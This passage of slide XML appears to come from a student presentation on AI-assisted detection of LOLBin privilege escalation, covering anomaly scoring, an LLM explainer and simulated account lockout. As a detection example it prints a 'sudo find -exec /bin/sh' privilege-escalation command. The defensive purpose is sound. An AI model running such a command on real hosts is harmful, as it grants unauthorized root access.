              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simulates locking the compromised account: 'passwd -l &lt;user&gt;' on Linux or 'net user &lt;user&gt; /active:no' on Windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:defRPr sz="900" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Persistent Audit Logging: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every containment action is timestamped and recorded in 'data/edr_mitigations.log' for forensic accountability.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691640"/>
            <a:ext cx="542513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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Autonomous Remediation Workflow: Alert to Containment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15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>1. Anomaly Flagged by Isolation Forest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="1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  ➔ Unsupervised detector identifies anomalous sliding window pattern (Score: 0.8503).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15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>2. LLM Explainer Assesses Threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="1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  ➔ Zero-shot model analyzes command semantics and assigns 'Verdict: Malicious' (Confidence: 95%).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15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>3. Active Response Trigger Evaluated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="1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  ➔ Script parses the offending Process ID (18452) and Username (attacker) from the LLM dossier.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15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>4. Simulated Host Containment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="1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  ➔ Executes 'kill -9 18452' (kills process tree) and 'passwd -l attacker' (locks user account).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15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>5. Forensics &amp; Audit Trail Persisted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
              <a:defRPr sz="850">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>  ➔ Mitigation event, timestamp, and simulated commands logged to data/edr_mitigations.log.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4114800" cy="2926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D4ED8"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>● AI EXPLAINABILITY &amp; SOC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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>AI Explainability: Plain-English Reports for SOC Analysts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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Translating mathematical anomaly scores into clear, human-readable triage summaries in seconds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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1150" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Why Pairing Anomaly Detection with an LLM Solves the SOC Alert Crisis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Traditional ML anomaly models output cryptic mathematical numbers (e.g., 'Score: 0.85, Entropy: 4.8'). Junior SOC analysts cannot easily tell if this is a real hacker or a routine script. Our LLM layer automatically reviews the anomaly features and command history to write a clear, accurate 1-paragraph summary.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521208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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="1E3A8A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>What the Machine Detects (Raw Anomaly Data)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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Flagged Process: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>find (Parent: sudo, User ID: 0 root)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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Command Line: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo find . -exec /bin/sh -c 'id; echo [Tier1] find exec' \; -quit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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Anomaly Score: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0.8503 (High Outlier, Threshold = 0.50)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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Sequence Context: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Elevated randomness; shell invocation token detected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="900" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>• Lineage Rarity: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Rare parent-child pairing (sudo executing find with exec)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5242255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t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="15803D"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>What the Analyst Sees (Plain-English SOC Verdict)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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>VERDICT: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malicious — Privilege Escalation / GTFOBin Abuse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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>ATTRIBUTED TECHNIQUE: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Abuse Elevation Control Mechanism: Sudo (find -exec)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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>MITRE ATT&amp;CK ID: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1548.003 (Privilege Escalation via Sudo)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2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>CONFIDENCE SCORE: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>95% (High Confidence)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:defRPr sz="850" b="1">
                <a:solidFill>
                  <a:srgbClr val="2563EB"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>EXPLANATION: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"The user executed the 'find' utility with root privileges via sudo and invoked an interactive subshell using the '-exec' flag. This is a classic GTFOBin privilege escalation technique used to break out of restricted shells and obtain root access. Recommended action: Immediately revoke sudo privileges for this user and isolate the host."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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>AI-Assisted Detection of LOLBin-Based Privilege Escalation | NFSU M.Tech Cyber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Helvetica"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>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algn="b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  <a:scene3d xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"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 xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"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 xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"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10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</cp:coreProperties>
</file>